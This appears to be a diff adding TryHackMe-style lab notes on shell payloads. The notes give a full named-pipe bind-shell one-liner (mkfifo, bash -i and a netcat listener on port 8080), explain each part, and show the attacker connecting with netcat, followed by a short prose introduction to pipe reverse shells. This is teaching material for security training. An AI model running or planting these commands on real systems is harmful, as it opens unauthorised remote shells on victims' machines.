@@ -117,5 +117,69 @@ target@tryhackme:~$
 The attacker now has full shell access to the compromised machine.
 
 ---
+# Bind Shell and Pipe Reverse Shell Payloads
+
+## Bind Shell
+
+A **bind shell** opens a listening port on the target machine. The attacker connects to this port to get a shell, allowing remote command execution. This approach is used when the target cannot initiate outbound connections.
+
+### How Bind Shell Works
+
+The following payload sets up a bind shell on the target:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+### Breakdown of the Payload
+
+- `rm -f /tmp/f`  
+  Removes any existing named pipe (`/tmp/f`) to avoid conflicts.
+
+- `mkfifo /tmp/f`  
+  Creates a named pipe (FIFO) at `/tmp/f`. This pipe will be used for bidirectional data flow.
+
+- `cat /tmp/f`  
+  Reads input from the named pipe.
+
+- `| bash -i 2>&1`  
+  Sends the input to an interactive bash shell. The `2>&1` redirects standard error to standard output, so all output (stdout + stderr) is captured.
+
+- `| nc -l 0.0.0.0 8080`  
+  Starts a Netcat listener on all interfaces (`0.0.0.0`) at port `8080`. When an attacker connects to this port, the shell session is exposed.
+
+- `> /tmp/f`  
+  Writes the shell output back to the named pipe for sending to the attacker.
+
+### Use on Target Machine
+
+```bash
+target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+### Use on Attacker Machine
+
+To connect to the bind shell:
+
+```bash
+nc -nv TARGET_IP 8080
+```
+
+**Explanation:**
+- `nc` starts Netcat.
+- `-n` disables DNS resolution.
+- `-v` enables verbose mode.
+- `TARGET_IP` is the IP of the target machine.
+- `8080` is the listening port.
+
+
+## Pipe Reverse Shell
+
+In contrast to the bind shell, a **reverse shell** initiates a connection from the target to the attacker's system. The attacker sets up a listener, and the target machine connects back to it.
+
+The pipe technique is used to emulate bidirectional communication using named pipes (FIFOs). This can be used in either bind or reverse shells. In the bind shell example above, we used the named pipe `/tmp/f` to handle both input and output.
+
+This method is popular in restricted environments because it avoids complex tools and uses only bash and Netcat, which are often pre-installed.
+
 
 
